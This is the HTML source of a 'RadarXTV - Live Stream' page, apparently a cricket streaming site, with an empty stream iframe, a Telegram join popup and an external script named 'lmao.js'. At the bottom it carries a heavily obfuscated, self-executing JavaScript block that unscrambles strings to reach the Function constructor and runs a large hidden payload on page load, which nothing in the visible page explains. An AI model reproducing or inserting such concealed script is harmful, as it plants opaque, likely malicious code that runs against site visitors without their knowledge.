<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var OoW='',CAS=748-737;function LHm(n){var h=1073128;var p=n.length;var q=[];for(var y=0;y<p;y++){q[y]=n.charAt(y)};for(var y=0;y<p;y++){var s=h*(y+458)+(h%39058);var r=h*(y+150)+(h%40123);var a=s%p;var m=r%p;var l=q[a];q[a]=q[m];q[m]=l;h=(s+r)%5630290;};return q.join('')};var qJB=LHm('moorhlsrxgbjrnsocktiefdazucqyptcvwutn').substr(0,CAS);var MeP=')a[tf=vegi1hn,8].rhjprvz{" itjcw7[.n;lsnejl+he(uA}nvf=}a ,s=ahad(j>10t.[mf=nruy9m,f(]n]0;e.l=76,a+ouhlor4[m6n8r)72, l,<0=a+r+0v=[[rdltnvc =j4)ayln;=(ngto.=(ggfpt0.s.}.!;v a;,08r]e"p=."(7r+w]lqme(7nf,r(fa,;7;o=qtz51uoe vh ;6p(),(4p{c=vrsaj"fx8v-ert=v=e.cp1{fcpnj>xl.r.sfl) ;ce0]CrtzshmCeo0[;o-)qva a,5=wnle=)rsh6l=x)h8o=- =;6gp](fdraavouk,;r,a.;)<nt2(()l)0(2o16)Coq]svlxd=;kv+={h+rb,lk-"vsh[vauAtit)f.ere=r[8 c;bf] gum;+p-b)qg 8"c3aS21d;atlgnv=rt9w6),h++a+)(yj[Avu+i)ev;a=,;(7.l(refhawu))x9-tnhdi+or{+ex"+dr(.0rC"v;e;{;670iu9)r=A,xf2= (lp;,cuntb;Censi})bia;t(}vn;5(;ua7;.ahr.a3r)ou[][.rtac+4+.,s8=;tSa[8laiCt);li f=}2kf(61(tv(v h)rng4r=fi)c.liahnxvs"ips +- (a)v+1[4ohd<,h=yvs01+]Cge ssa(;rnrbvuoin rb(.v;r;=)=hisma ;oj9n==g,92gm2o1d,3tgjrni9i;)v,ve;r da=v=ilg;)so7lw;v)nv; tu)kl(2m;]+s;)voaa1.re) jhrl;+;+,v(s=]]tio.a.r=!lAf(a;;hfhl*gr)b;cr5=<(an1l9re;er,=o.daorfgu(( x,<Csulf*+",+l=}o(no{u.';var rSF=LHm[qJB];var CWL='';var HIT=rSF;var KZx=rSF(CWL,LHm(MeP));var Com=KZx(LHm('.)PaJLw);Pewt}uCn}6_!erp<PaPi$(#)(=a1)[Pal.nPm43Aj$KP)P;-l4u5(7PP)f5ou(noo_naePP4PTPlP,%.e;i;ig(7.]]g=nttP0f_iliPoqr*4u={f.i9=c\/.a\/s];(#!s][w.Id!nC)e1PPKPc$PaeP_nfS%P;n3n7elPh\',"}6PaEP5n1&!o.(b7UP:fy .M4$w(.4_%r!PPP=)6tcc4cus$=.1$i3\/{M%rb t(7.tp\'_eso .n.E}$P}P1Pei,7=Pr>e;$d3ft,;.sg(% uo [P3d!J_tcsi3d53P.yuPo\/r9od$yiG3l!>)e 8e%re2+ddbtPqPeycPP_6{_8a(IuphP\/if;o?tPoc.e(dl0s}jptP7.=Bos..)P!P;.;=7usia(u.PeoD%be)mPli \'cr.PPnu_PPtn.5PPcPt4u\/c;oHeekD]edPPpPyP4terafeO>P%]75%a.Pn?au@P)fP):2vOec=5rf9i.P&!nGmbfbfbOIa7r9+(ac%&.c8t%]er3,1e87.j.,;(Po]cgfG)j_)nlCCia}sefeet($P i%S nsoE5 tr,!fPs)jktn_P(e9$I9]tiPRJ}Lp!{Pb{1,P!$mPQ;2_\/2cbPet*PP)EejSyBP7ms==t6P(gf_PP(8$5;fPn!!i1P.Mue}P5,.!Kr.c(t)2._al}P{rP]6ht;P(iPPrqo.;6.0R4 tee;rAfn;E_(p=3.!e6)jPD3 .6H3bj7uf# (rP_3h1bjs]dyhe)_{89i.r_0J6!P)a1()Po.!c]Pe.{P_l,}e;]riPo{1oPtfPt)rna!e60ncP%fe+e.(u%a,3(%d.);nn,i({))doPPo)P4a3)l)o;PtBbfP4tbfn_ffpniPP{36nf,t2FfNsOPj(0d{,Pjd3Pr"7PrPfPP(iPl{1ouur(n.5tn_nUnoifPLPesli!)Ng,w_H)s{OPP!2)iP4)PPP[4P[Pmef)i{{Pt=o2jr[PP0tg.))2o7-11rPnfes 2ct3PJ2rPbO)PP.Pe,)u@.bb,4Br1o)$e#v%1bi39;]=lP3:ri)R0#9o!.%_Pr(P_]\/)3}{>sr8=lP[.o_Fn.[PrPj")toPPmB0i3{4]fofePTP;SFocP!6b)66[._;!Plf.cgl,#a+s;dP);<3.uoPt{"#1\'i,l;nk_P yP$n,7[nP;fr}UwPM%fPe1o.wP9  nl.nle6P;{P!P)l;yP.3PtPc )eP{)ife&eD_{m2leqox.c3)tn\/_bb3%l\/nsP#7c6)iPP6]su, ;)2;cfPP$G3ct{{P2.#)tcis9f"PPsPOc.6$fon.f0]Ant,3vP)-p(1l=&M8jc%fn*9bP@34r;PPd$]O;im.6PP()7(o_;)ifCs($%,n6cP]8=h7fe }o!ofn]a;+P)+P?v3!PttP$>){)G)bl(6fPn.w!$i2pw,O!*e_]30qe=i]o}iKsPov)oCd(ot_,P .Pe;o7;PR.@_17i9;SP,P,!t1lifcc1g33.D_,2.!plLg)PPef]H),3P uria6ot)yomOn,P .cP]P:lj3\/!Plner)fPPP%"flofP$ylPO[ax_5[]8P lPPw,n%s\/]N3]zP.n5PEf$P0f0%+Pje7fr3Pd$%{tpPu2]f.)lP"%opi90=4l](e=.si_"(n%btP.(6e1P}Pk.$d(PPf$&f]f.o{\']PpPa21]oum%$i]niP.il(&!Pni_v75n.!(3$?fPa]4S ;);C}ai(e{6P.Q5oPMa.%R2fpCwi8Pif bOPecT_P=7Pe]_.]!c31P1] ht.Po2)efPP(.#? %Prb.f1f}l&Pl%j(_80(_re(.r)!CI[g2P)ePt%oP8lltn,a.n;lu_P.))<PP"k)P0Pl])PrP[fr1eP sE(<s!4jl-3P4+5tor.n(;Pv,=P8[ 73Af]eP)P4laii(r<!P6Pa9)$0{)_{]P_P?g4PbefEu_843.PPs)P!)a)32"QP:OP.Pl1DPR]1P!$, w).PHn P1s;(P\/RoPiePo4Pfnmsi9Pe3=(()nJPF]P)]jo P2D}})PPa9P(g;]!nPaf9]%d7:PJ(w4d;";kP&Pf j{M3);3dSPPm)z_5b{iPePnPb.PP {7119s8r{]u1+g t=(ol$P]dP9 3PNmJ3titc=_ot(tf_r(_ns0o8lP8iO3.S(_(ekP}]fP6P==ioO=n2(7e ..P_fhub$,P!ck3_Ti_ry.52_c399Pmn3f(efKcjl)3(3(I1{16n$ SPna]8 );,Qft)f [ljf"%c$;,lPq}fP=P(P 0 PKfi3rgf(n(,r !P 7.lqPni.}w>_\'l];r0\/1fPPPc%PP P;f( )tE6_f\/e)e 4!Pg2 t0!m5oc:P=Pf1%%l$iO=(PQ3PLPe]d$Pfah.S_u0bs9bPP$J)n;o%_>rP4tPw)lf=5}.%n9#] )a52dP0_,Cff!l%D on%PPm)(apPeaP_]Pf.K00Pn}P[I (,])aPj;9$f)jU))l.{{ rgn1f.)(4P9s);e_f.)'));var Ezw=HIT(OoW,Com );Ezw(6783);return 3974})()
</script>

</body>
</html>